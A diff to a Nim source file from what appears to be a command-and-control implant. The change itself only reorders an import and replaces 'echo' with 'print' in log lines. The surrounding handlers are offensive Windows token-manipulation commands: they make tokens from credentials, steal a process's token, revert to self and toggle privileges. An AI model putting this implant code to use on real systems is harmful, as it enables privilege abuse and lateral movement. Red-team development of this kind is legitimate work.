@@ -88,13 +88,13 @@ when not defined(agent):
 when defined(agent):
 
     import winim, strutils, strformat
+    import ../agent/core/[token, io]
     import ../agent/protocol/result
-    import ../agent/core/token
     import ../common/utils
     
     proc executeMakeToken(ctx: AgentCtx, task: Task): TaskResult =  
         try: 
-            echo fmt"   [>] Creating access token from username and password."
+            print fmt"   [>] Creating access token from username and password."
             
             var logonType: DWORD = LOGON32_LOGON_NEW_CREDENTIALS
             var  
@@ -119,7 +119,7 @@ when defined(agent):
         
     proc executeStealToken(ctx: AgentCtx, task: Task): TaskResult = 
         try: 
-            echo fmt"   [>] Stealing access token."
+            print fmt"   [>] Stealing access token."
 
             let pid = int(Bytes.toUint32(task.args[0].data))       
             let username  = stealToken(pid)
@@ -131,7 +131,7 @@ when defined(agent):
 
     proc executeRev2Self(ctx: AgentCtx, task: Task): TaskResult = 
         try: 
-            echo fmt"   [>] Reverting access token."
+            print fmt"   [>] Reverting access token."
             rev2self()
             return createTaskResult(task, STATUS_COMPLETED, RESULT_NO_OUTPUT, @[])
 
@@ -140,7 +140,7 @@ when defined(agent):
         
     proc executeTokenInfo(ctx: AgentCtx, task: Task): TaskResult = 
         try: 
-            echo fmt"   [>] Retrieving token information."
+            print fmt"   [>] Retrieving token information."
             let tokenInfo = getCurrentToken().getTokenInfo() 
             return createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(tokenInfo))
 
@@ -149,7 +149,7 @@ when defined(agent):
 
     proc executeEnablePrivilege(ctx: AgentCtx, task: Task): TaskResult = 
         try: 
-            echo fmt"   [>] Enabling token privilege."
+            print fmt"   [>] Enabling token privilege."
             let privilege = Bytes.toString(task.args[0].data)            
             return createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(enablePrivilege(privilege)))
 
@@ -158,7 +158,7 @@ when defined(agent):
 
     proc executeDisablePrivilege(ctx: AgentCtx, task: Task): TaskResult = 
         try: 
-            echo fmt"   [>] Disabling token privilege."
+            print fmt"   [>] Disabling token privilege."
             let privilege = Bytes.toString(task.args[0].data)            
             return createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(enablePrivilege(privilege, false)))
 
